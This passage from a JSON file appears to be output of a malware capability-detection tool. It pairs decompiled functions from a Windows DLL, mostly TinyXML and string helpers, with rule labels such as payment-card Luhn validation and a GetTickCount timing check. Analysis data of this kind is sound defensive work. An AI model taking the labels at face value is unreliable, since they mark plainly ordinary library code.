        "decompiled_code": "\nvoid fcn.18000f360(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000f5c0(arg1, arg3);\n    fcn.18000f630(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 60
    },
    "18000f55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f550(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18000f5c0(arg1, arg3);\n    fcn.180010200(arg1);\n    fcn.18000f7a0(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 79
    },
    "18000f5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f5e0(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iStackX8;\n    \n    for (iStackX8 = arg1; iStackX8 != arg2; iStackX8 = iStackX8 + 0x28) {\n        fcn.18000f820(arg3, iStackX8);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "18000f63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000f630(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    ulong arg2_00;\n    int64_t iStackX8;\n    int64_t iStackX24;\n    \n    iStackX24 = arg3;\n    for (iStackX8 = arg1; iStackX8 != arg2; iStackX8 = iStackX8 + 0x28) {\n        arg2_00 = fcn.18000eb30(iStackX8);\n        fcn.18000b7b0(iStackX24, arg2_00);\n        iStackX24 = iStackX24 + 0x28;\n    }\n    return iStackX24;\n}\n",
        "token_count": 164
    },
    "18000f72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000f720(ulong arg1, int64_t arg2)\n\n{\n    ulong arg2_00;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    arg2_00 = fcn.18000eb40(puStack32, arg2 + 0x20);\n    fcn.18000b9e0(arg1, arg2_00);\n    fcn.1800033c0(arg1, 0, 0);\n    fcn.18000c000(arg1, arg2, 0, 0xffffffffffffffff);\n    return arg1;\n}\n",
        "token_count": 160
    },
    "18000f7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000f7a0(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    int64_t iStackX8;\n    int64_t iStackX24;\n    \n    iStackX24 = arg3;\n    for (iStackX8 = arg1; iStackX8 != arg2; iStackX8 = iStackX8 + 0x28) {\n        fcn.18000f290(arg4, iStackX24, iStackX8);\n        iStackX24 = iStackX24 + 0x28;\n    }\n    return iStackX24;\n}\n",
        "token_count": 146
    },
    "18000f82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f820(ulong arg1, ulong arg2)\n\n{\n    fcn.18000f850(arg1, arg2);\n    return;\n}\n",
        "token_count": 37
    },
    "18000f85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f850(ulong arg1, ulong arg2)\n\n{\n    fcn.18000f870(arg2);\n    return;\n}\n",
        "token_count": 34
    },
    "18000f87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f870(ulong arg1)\n\n{\n    fcn.18000f890(arg1, 0);\n    return;\n}\n",
        "token_count": 33
    },
    "18000f8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f8f0(ulong arg1)\n\n{\n    fcn.18000fb40(arg1);\n    return;\n}\n",
        "token_count": 32
    },
    "18000f91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f910(ulong arg1, ulong arg2)\n\n{\n    ulong arg3;\n    ulong arg2_00;\n    \n    arg3 = fcn.18000f960(arg2);\n    arg2_00 = fcn.18000fa40(arg2);\n    fcn.18000fd10(arg1, arg2_00, arg3);\n    return;\n}\n",
        "token_count": 85
    },
    "18000f9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f9a0(ulong *arg1, ulong *arg2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = *arg1;\n    *arg1 = *arg2;\n    *arg2 = uVar1;\n    return;\n}\n",
        "token_count": 61
    },
    "18000f9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f9e0(ulong arg1, ulong arg2)\n\n{\n    fcn.18000fa80(arg1, arg2, arg2);\n    return;\n}\n",
        "token_count": 42
    },
    "18000fa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000fa40(int64_t *arg1)\n\n{\n    return *arg1 + 0x10;\n}\n",
        "token_count": 31
    },
    "18000fb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fb40(int64_t *arg1)\n\n{\n    if (*arg1 != 0x180049d78) {\n        fcn.180023e94(*arg1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "18000fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fb80(ulong arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    ulong arg2_00;\n    uchar *puVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar auStack56 [8];\n    ulong uStack48;\n    int64_t iStack40;\n    uchar *puStack32;\n    \n    uStack48 = 0xfffffffffffffffe;\n    uVar1 = fcn.18000f980(arg1);\n    if (uVar1 < arg2) {\n        fcn.18000f8d0(auStack56);\n        arg2_00 = fcn.18000f960(arg1);\n        fcn.18000fa80(auStack56, arg2_00, arg2);\n        iStack40 = fcn.18000f960(arg1);\n        puStack32 = fcn.18000fa40(arg1);\n        puVar2 = fcn.18000fa40(auStack56);\n        puVar4 = puStack32;\n        for (iVar3 = iStack40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        fcn.18000f9a0(arg1, auStack56);\n        fcn.18000f8f0(auStack56);\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "18000fc3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000fc30(ulong arg1, uchar *arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uchar *puVar2;\n    ulong arg1_00;\n    uchar auStack48 [8];\n    ulong uStack40;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uVar1 = fcn.18000f980(arg1);\n    if ((uVar1 < arg3) || ((arg3 + 8) * 3 < uVar1)) {\n        fcn.18000f8d0(auStack48);\n        fcn.18000f9e0(auStack48, arg3);\n        puVar2 = fcn.18000fa40(auStack48);\n        for (; arg3 != 0; arg3 = arg3 - 1) {\n            *puVar2 = *arg2;\n            arg2 = arg2 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        fcn.18000f9a0(arg1, auStack48);\n        fcn.18000f8f0(auStack48);\n    }\n    else {\n        arg1_00 = fcn.18000fa40(arg1);\n        fcn.180023b60(arg1_00, arg2, arg3);\n        fcn.18000fa10(arg1, arg3);\n    }\n    return arg1;\n}\n",
        "token_count": 313
    },
    "18000fd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.18000fd10(ulong arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uint64_t arg2_00;\n    uint64_t uVar2;\n    ulong arg1_00;\n    \n    iVar1 = fcn.18000f960(arg1);\n    arg2_00 = iVar1 + arg3;\n    uVar2 = fcn.18000f980(arg1);\n    if (uVar2 < arg2_00) {\n        iVar1 = fcn.18000f980(arg1);\n        fcn.18000fb80(arg1, arg2_00 + iVar1);\n    }\n    arg1_00 = fcn.18000fa60(arg1);\n    fcn.180023b60(arg1_00, arg2, arg3);\n    fcn.18000fa10(arg1, arg2_00);\n    return arg1;\n}\n",
        "token_count": 203
    },
    "18000fda": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000fda0(ulong *arg1, char *arg2)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    uint64_t uVar4;\n    \n    *arg1 = 0;\n    uVar4 = 0xffffffffffffffff;\n    pcVar3 = arg2;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.18000f9e0(arg1, ~uVar4 - 1);\n    iVar2 = fcn.18000f960(arg1);\n    pcVar3 = fcn.18000fa40(arg1);\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *pcVar3 = *arg2;\n        arg2 = arg2 + 1;\n        pcVar3 = pcVar3 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 247
    },
    "18000fe2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fe20(ulong arg1, char *arg2)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcVar3;\n    \n    uVar2 = 0xffffffffffffffff;\n    pcVar3 = arg2;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.18000fc30(arg1, arg2, ~uVar2 - 1);\n    return;\n}\n",
        "token_count": 146
    },
    "18000fe6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fe60(ulong arg1, ulong arg2)\n\n{\n    ulong arg3;\n    ulong arg2_00;\n    \n    arg3 = fcn.18000f960(arg2);\n    arg2_00 = fcn.18000fa40(arg2);\n    fcn.18000fc30(arg1, arg2_00, arg3);\n    return;\n}\n",
        "token_count": 85
    },
    "18000feb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000feb0(ulong arg1, char *arg2)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcVar3;\n    \n    uVar2 = 0xffffffffffffffff;\n    pcVar3 = arg2;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.18000fd10(arg1, arg2, ~uVar2 - 1);\n    return;\n}\n",
        "token_count": 146
    },
    "18000fef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fef0(ulong arg1)\n\n{\n    uchar auStackX16 [24];\n    \n    fcn.18000fd10(arg1, auStackX16, 1);\n    return;\n}\n",
        "token_count": 48
    },
    "18000ff7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000ff70(ulong arg1)\n\n{\n    uint8_t in_DL;\n    \n    fcn.18000ffa0(arg1, in_DL, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "18000ffa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000ffa0(ulong arg1, ulong noname_1, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    char *pcStack24;\n    \n    uVar1 = fcn.18000f960(arg1);\n    if (arg3 < uVar1) {\n        iVar2 = fcn.18000fa40(arg1);\n        for (pcStack24 = iVar2 + arg3; *pcStack24 != '\\0'; pcStack24 = pcStack24 + 1) {\n            if (*pcStack24 == noname_1) {\n                iVar2 = fcn.18000fa40(arg1);\n                return pcStack24 - iVar2;\n            }\n        }\n    }\n    return *0x180039ac0;\n}\n",
        "token_count": 178
    },
    "18001004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180010040(ulong arg1)\n\n{\n    fcn.180010060(arg1);\n    return arg1;\n}\n",
        "token_count": 30
    },
    "18001012": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010120(int64_t arg1)\n\n{\n    fcn.18000fa40(arg1 + 0x38);\n    return;\n}\n",
        "token_count": 35
    },
    "18001014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010140(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000fe20(arg1 + 0x38, arg2);\n    return;\n}\n",
        "token_count": 42
    },
    "18001019": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010190(ulong arg1)\n\n{\n    fcn.180010f70(arg1);\n    return;\n}\n",
        "token_count": 29
    },
    "1800101b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800101b0(ulong arg1)\n\n{\n    fcn.180010f00(arg1);\n    return;\n}\n",
        "token_count": 31
    },
    "1800101e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800101e0(ulong arg1)\n\n{\n    fcn.180010fe0(arg1);\n    return;\n}\n",
        "token_count": 31
    },
    "18001021": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180010210(code **arg1)\n\n{\n    fcn.180010080(arg1);\n    *arg1 = vtable.TiXmlAttribute.0;\n    fcn.18000f8d0(arg1 + 4);\n    fcn.18000f8d0(arg1 + 5);\n    arg1[3] = NULL;\n    arg1[7] = NULL;\n    arg1[6] = NULL;\n    return arg1;\n}\n",
        "token_count": 103
    },
    "1800102b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800102b0(int64_t arg1)\n\n{\n    fcn.18000fa40(arg1 + 0x28);\n    return;\n}\n",
        "token_count": 37
    },
    "1800102d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800102d0(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000fe20(arg1 + 0x20, arg2);\n    return;\n}\n",
        "token_count": 44
    },
    "18001030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010300(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000fe20(arg1 + 0x28, arg2);\n    return;\n}\n",
        "token_count": 42
    },
    "1800103a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800103a0(int64_t arg1)\n\n{\n    fcn.18000f8f0(arg1 + 0x28);\n    fcn.18000f8f0(arg1 + 0x20);\n    fcn.1800100c0(arg1);\n    return;\n}\n",
        "token_count": 69
    },
    "1800103e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800103e0(int64_t arg1)\n\n{\n    ulong uStack24;\n    \n    if (*(arg1 + 0x38) == arg1) {\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = *(arg1 + 0x38);\n    }\n    return uStack24;\n}\n",
        "token_count": 76
    },
    "18001042": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180010420(code **arg1)\n\n{\n    fcn.180010b50(arg1, 2);\n    *arg1 = vtable.TiXmlComment.0;\n    return arg1;\n}\n",
        "token_count": 49
    },
    "18001046": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010460(code **arg1)\n\n{\n    *arg1 = vtable.TiXmlComment.0;\n    fcn.180010c20(arg1);\n    return;\n}\n",
        "token_count": 43
    },
    "1800104d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.1800104d0(code **arg1, ulong arg2)\n\n{\n    fcn.180010b50(arg1, 4);\n    *arg1 = vtable.TiXmlText.0;\n    fcn.180010140(arg1, arg2);\n    *(arg1 + 10) = 0;\n    return arg1;\n}\n",
        "token_count": 80
    },
    "18001053": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010530(code **arg1)\n\n{\n    *arg1 = vtable.TiXmlText.0;\n    fcn.180010c20(arg1);\n    return;\n}\n",
        "token_count": 43
    },
    "1800106f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.1800106f0(code **arg1)\n\n{\n    fcn.180010b50(arg1, 3);\n    *arg1 = vtable.TiXmlUnknown.0;\n    return arg1;\n}\n",
        "token_count": 51
    },
    "18001073": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010730(code **arg1)\n\n{\n    *arg1 = vtable.TiXmlUnknown.0;\n    fcn.180010c20(arg1);\n    return;\n}\n",
        "token_count": 43
    },
    "1800107a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800107a0(code **arg1)\n\n{\n    *arg1 = vtable.TiXmlDocument.0;\n    fcn.18000f8f0(arg1 + 0xb);\n    fcn.180010c20(arg1);\n    return;\n}\n",
        "token_count": 62
    },
    "1800107f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800107f0(int64_t arg1)\n\n{\n    *(arg1 + 0x50) = 0;\n    *(arg1 + 0x54) = 0;\n    fcn.18000fe20(arg1 + 0x58, 0x180039ecc);\n    *(arg1 + 0x68) = 0;\n    *(arg1 + 100) = 0;\n    return;\n}\n",
        "token_count": 98
    },
    "180010ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010ce0(int64_t arg1, int64_t arg2)\n\n{\n    ulong arg2_00;\n    \n    arg2_00 = fcn.18000fa40(arg1 + 0x38);\n    fcn.180010140(arg2, arg2_00);\n    *(arg2 + 0x10) = *(arg1 + 0x10);\n    *(arg2 + 8) = *(arg1 + 8);\n    return;\n}\n",
        "token_count": 106
    },
    "18001104": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180011040(code **arg1, ulong arg2)\n\n{\n    fcn.180010b50(arg1, 1);\n    *arg1 = vtable.TiXmlElement.0;\n    fcn.1800123d0(arg1 + 10);\n    arg1[6] = NULL;\n    arg1[5] = NULL;\n    fcn.18000fe20(arg1 + 7, arg2);\n    return arg1;\n}\n",
        "token_count": 102
    },
    "18001175": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180011750(code **arg1)\n\n{\n    fcn.180010b50(arg1, 0);\n    *arg1 = vtable.TiXmlDocument.0;\n    fcn.18000f8d0(arg1 + 0xb);\n    fcn.180010040(arg1 + 100);\n    *(arg1 + 0xc) = 4;\n    *(arg1 + 0x6c) = 0;\n    fcn.1800107f0(arg1);\n    return arg1;\n}\n",
        "token_count": 119
    },
    "180011a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180011a30(int64_t arg1)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.18000ff20(*(arg1 + 0x38) + 0x28);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.18000ff20(*(arg1 + 0x38) + 0x20),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return *(arg1 + 0x38);\n}\n",
        "token_count": 116
    },
    "180011cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011cb0(ulong arg1, ulong arg2)\n\n{\n    fcn.180010ce0(arg1, arg2);\n    return;\n}\n",
        "token_count": 37
    },
    "180011e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011e80(int64_t arg1, int64_t arg2)\n\n{\n    fcn.180010ce0(arg1, arg2);\n    *(arg2 + 0x50) = *(arg1 + 0x50);\n    return;\n}\n",
        "token_count": 60
    },
    "1800123d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800123d0(int64_t arg1)\n\n{\n    fcn.180010210(arg1);\n    *(arg1 + 0x38) = arg1;\n    *(arg1 + 0x30) = arg1;\n    return arg1;\n}\n",
        "token_count": 63
    },
    "18001241": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012410(ulong arg1)\n\n{\n    fcn.1800103a0(arg1);\n    return;\n}\n",
        "token_count": 30
    },
    "18001248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012480(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iStack24;\n    \n    iStack24 = *(arg1 + 0x38);\n    while( true ) {\n        if (iStack24 == arg1) {\n            return;\n        }\n        if (iStack24 == arg2) break;\n        iStack24 = *(iStack24 + 0x38);\n    }\n    *(*(iStack24 + 0x30) + 0x38) = *(iStack24 + 0x38);\n    *(*(iStack24 + 0x38) + 0x30) = *(iStack24 + 0x30);\n    *(iStack24 + 0x38) = 0;\n    *(iStack24 + 0x30) = 0;\n    return;\n}\n",
        "token_count": 187
    },
    "18001251": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180012510(int64_t arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    int64_t iVar5;\n    int64_t iStack24;\n    \n    iStack24 = *(arg1 + 0x38);\n    do {\n        if (iStack24 == arg1) {\n            return 0;\n        }\n        puVar4 = fcn.18000fa40(iStack24 + 0x20);\n        iVar5 = arg2 - puVar4;\n        do {\n            uVar1 = *puVar4;\n            if (uVar1 != puVar4[iVar5]) {\n                uVar2 = uVar1 < puVar4[iVar5];\n                iVar3 = (1 - uVar2) - (uVar2 != 0);\n                goto code_r0x000180012579;\n            }\n            puVar4 = puVar4 + 1;\n        } while (uVar1 != 0);\n        iVar3 = 0;\ncode_r0x000180012579:\n        if (iVar3 == 0) {\n            return iStack24;\n        }\n        iStack24 = *(iStack24 + 0x38);\n    } while( true );\n}\n",
        "token_count": 292
    },
    "18001263": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012630(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uStackX32;\n    \n    uStackX32 = arg4;\n    fcn.180024970(arg1, 0x20, arg2, arg3, &uStackX32);\n    return;\n}\n",
        "token_count": 74
    },
    "18001287": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012870(int64_t arg1)\n\n{\n    fcn.18000fa40(arg1 + 0x58);\n    return;\n}\n",
        "token_count": 35
    },
    "180012ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.180012ae0(uint *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint in_stack_00000028;\n    \n    fcn.180010040(arg1);\n    *(arg1 + 2) = arg2;\n    arg1[4] = arg3;\n    *arg1 = arg4;\n    arg1[1] = in_stack_00000028;\n    return arg1;\n}\n",
        "token_count": 98
    },
    "180015ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180015ad0(int64_t arg1)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uchar *puVar3;\n    uint32_t uStack24;\n    \n    uStack24 = 0;\n    while( true ) {\n        uVar2 = fcn.18000f960(arg1 + 0x38);\n        if (uVar2 <= uStack24) {\n            return 1;\n        }\n        puVar3 = fcn.18000ff50(arg1 + 0x38, uStack24);\n        cVar1 = fcn.180012690(*puVar3);\n        if (cVar1 == '\\0') break;\n        uStack24 = uStack24 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 171
    },
    "180015cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180015cd0(ulong arg1, ulong arg2)\n\n{\n    uchar *arg2_00;\n    uchar auStack120 [40];\n    uchar auStack80 [40];\n    int16_t *piStack40;\n    uint32_t uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack24 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack120;\n    uStack32 = 0;\n    fcn.18000e3d0(auStack80);\n    for (piStack40 = fcn.1800020d0(arg2); *piStack40 != 0; piStack40 = piStack40 + 1) {\n        fcn.180025634(*piStack40);\n        fcn.18001c2c0(auStack80);\n    }\n    arg2_00 = auStack80;\n    fcn.18000e420(arg1, arg2_00);\n    uStack32 = uStack32 | 1;\n    fcn.180003370(auStack80, arg2_00);\n    fcn.180001ef0(arg2, arg2_00);\n    fcn.180023980(uStack16 ^ auStack120);\n    return;\n}\n",
        "token_count": 282
    },
    "180015db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180015db0(ulong arg1, ulong arg2)\n\n{\n    uchar auStack184 [40];\n    uchar auStack144 [40];\n    ulong uStack104;\n    uchar auStack96 [40];\n    uchar *puStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack48 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack184;\n    puStack56 = auStack96;\n    uStack40 = fcn.180001db0(puStack56, arg1);\n    uStack32 = fcn.180015cd0(auStack144, uStack40);\n    uStack24 = uStack32;\n    uStack104 = fcn.180015c30(uStack32, arg2);\n    fcn.180003370(auStack144, arg2);\n    fcn.180023980(uStack16 ^ auStack184);\n    return;\n}\n",
        "token_count": 228
    },
    "18001636": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
